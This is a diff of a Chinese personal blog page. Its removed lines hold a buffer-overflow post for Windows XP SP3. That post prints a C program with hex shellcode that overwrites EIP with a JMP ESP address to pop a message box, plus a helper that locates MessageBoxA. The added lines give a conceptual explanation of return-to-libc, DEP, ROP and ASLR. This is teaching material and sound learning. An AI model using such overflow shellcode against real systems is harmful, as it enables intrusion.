@@ -13,11 +13,11 @@
 
     <title>
         
-          缓冲区溢出 - Jerry&#39;s Blog | 王丰的博客
+          Return-to-libc - Jerry&#39;s Blog | 王丰的博客
         
     </title>
 
-    <link rel="canonical" href="http://yoursite.com/2016/07/16/缓冲区溢出/">
+    <link rel="canonical" href="http://yoursite.com/2016/07/28/Return-to-libc/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -158,14 +158,16 @@
                 <div class="post-heading">
                     <div class="tags">
                         
-                          <a class="tag" href="/tags/#buffer overflow" title="buffer overflow">buffer overflow</a>
+                          <a class="tag" href="/tags/#DEP" title="DEP">DEP</a>
+                        
+                          <a class="tag" href="/tags/#return-to-libc" title="return-to-libc">return-to-libc</a>
                         
                     </div>
-                    <h1>缓冲区溢出</h1>
+                    <h1>Return-to-libc</h1>
                     <h2 class="subheading"></h2>
                     <span class="meta">
                         Posted by Jerry Wang on
-                        2016-07-16
+                        2016-07-28
                     </span>
                 </div>
             </div>
@@ -185,13 +187,12 @@
                 post-container">
 
                 <blockquote>
-<p>环境： Windows XP SP3, VC6.0</p>
+<p>本文简要总结网上的一篇博客 <a href="http://www.ibm.com/developerworks/cn/linux/1402_liumei_rilattack/" target="_blank" rel="external">http://www.ibm.com/developerworks/cn/linux/1402_liumei_rilattack/</a></p>
 </blockquote>
-<p>先上代码：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"><span class="keyword">char</span> name[] = </div><div class="line"><span class="string">"\x41\x41\x41\x41"</span></div><div class="line"><span class="string">"\x41\x41\x41\x41"</span></div><div class="line"><span class="string">"\x41\x41\x41\x41"</span> <span class="comment">// 覆盖EBP</span></div><div class="line"><span class="string">"\x12\x45\xfa\x7f"</span> <span class="comment">// 将EIP覆盖为JMP ESP的地址</span></div><div class="line"><span class="string">"\x33\xDB\x53\x68\x66\x69\x73\x68\x68\x6B\x6F\x6F\x6B\x8B\xC4\x53\x50"</span> <span class="comment">// </span></div><div class="line"><span class="string">"\x50\x53\xB8"</span></div><div class="line"><span class="string">"\xEA\x07\xD5\x77"</span> <span class="comment">// 本机上messagebox的地址，每个机器是不一样的</span></div><div class="line"><span class="string">"\xFF\xD0\x53\xB8\xFA\xCA\x81\x7C\xFF\xD0"</span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">char</span> output[<span class="number">8</span>];</div><div class="line">    LoadLibrary(<span class="string">"user32.dll"</span>);</div><div class="line">    <span class="built_in">strcpy</span>(output,name);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>strcpy()函数不做越界检查，这段代码将EBP和EIP都覆盖掉。EIP将会别覆盖为0x7ffa4512，这个地址是一个通用的JMP ESP指令地址，适合Windows系统。JMP ESP将从栈顶开始执行，即原来的EIP下面开始。本示例中的shellcode会调用messagebox函数，每台机器上的message函数地址不一样，如果你想执行这段代码的话，需要将这个地址替换为自己的。messagebox的地址可以通过以下代码获得：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">        HINSTANCE LibHandle;</div><div class="line">        MYPROC ProcAdd;</div><div class="line">        LibHandle = LoadLibrary(<span class="string">"user32"</span>);</div><div class="line">        </div><div class="line">        ProcAdd = (MYPROC)GetProcAddress(LibHandle,<span class="string">"MessageBoxA"</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"system = //x%x\n"</span>,ProcAdd);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>效果如下<br><img src="result.png" alt="res"></p>
+<h3 id="DEP与Return-to-libc攻击"><a href="#DEP与Return-to-libc攻击" class="headerlink" title="DEP与Return-to-libc攻击"></a>DEP与Return-to-libc攻击</h3><p>缓冲区溢出通常需要将shellcode注入到堆栈中，然后覆盖函数的返回地址，指向shellcode，执行恶意代码。这种攻击方式可以概括为<strong>先写后执行</strong>。数据执行保护策略(Data Execution Prevention，DEP)可以用来防御这种攻击。DEP可以控制程序对内存的访问，被保护的程序只能是<strong>被写或被执行（W⊕X）</strong>，这样就能保证内存不能先被写然后被执行。但是这种方法不能抵御Return-to-libc。Return-to-libc<br>不需要注入恶意代码，没有同时写和执行的模式。</p>
+<p>Return-to-libc利用缓冲区溢出原理，将返回地址覆盖为库函数，并传递设定好的函数，这样就不需要注入可执行代码，即可绕过DEP检测，完成恶意攻击。复杂的Return-to-libc可以调用一系列的库函数来攻击。（库函数可以帮助攻击者完成哪些攻击我现在还不知道，是不是可以完成任意类型的攻击我也不知道，你看到这里你肯定也不知道:)。</p>
+<h3 id="返回导向编程ROP"><a href="#返回导向编程ROP" class="headerlink" title="返回导向编程ROP"></a>返回导向编程ROP</h3><p>Return-to-libc只能调用库函数，攻击能力有限。另一方面，在x86_64平台上，函数参数都是靠寄存器传递，而Return-to-libc靠栈传递参数，所以这种方法会失效。由于这种方法的局限性，ROP（Return-orinted Programming）被提出。ROP不局限于使用库函数，他可以从程序和库函数中选取一组指令，串起来形成shellcode，据说可以实现任意的操作。</p>
+<h3 id="防御机制"><a href="#防御机制" class="headerlink" title="防御机制"></a>防御机制</h3><p>地址空间布局随机化（Address Space Layout Randomization, ASLR）是最好的防御Return-to-libc和ROP的最好的方法。ASLR可以对进程中的堆、栈、代码和共享库里的地址进行随机化。地址被随机化了，那么攻击者就定位不到所需要的函数的地址了。地址混淆（Address Randomization）不仅可以随机化堆、栈、库函数和程序基址，还可以随机化<em>相对地址</em>、函数或变量的顺序。</p>
 
 
                 <hr>
@@ -200,13 +201,9 @@
 
                 <ul class="pager">
                     
-                        <li class="previous">
-                            <a href="/2016/07/28/Return-to-libc/" data-toggle="tooltip" data-placement="top" title="Return-to-libc">&larr; Previous Post</a>
-                        </li>
-                    
                     
                         <li class="next">
-                            <a href="/2016/07/14/ARP攻击/" data-toggle="tooltip" data-placement="top" title="ARP攻击">Next Post &rarr;</a>
+                            <a href="/2016/07/16/缓冲区溢出/" data-toggle="tooltip" data-placement="top" title="缓冲区溢出">Next Post &rarr;</a>
                         </li>
                     
                 </ul>
@@ -215,9 +212,9 @@
                 <!-- 多说评论框 start -->
                 <div class="comment">
                     <div class="ds-thread"
-                        data-thread-key="2016/07/16/缓冲区溢出/"
-                        data-title="缓冲区溢出"
-                        data-url="http://yoursite.com/2016/07/16/缓冲区溢出/" >
+                        data-thread-key="2016/07/28/Return-to-libc/"
+                        data-title="Return-to-libc"
+                        data-url="http://yoursite.com/2016/07/28/Return-to-libc/" >
                     </div>
                 </div>
                 <!-- 多说评论框 end -->
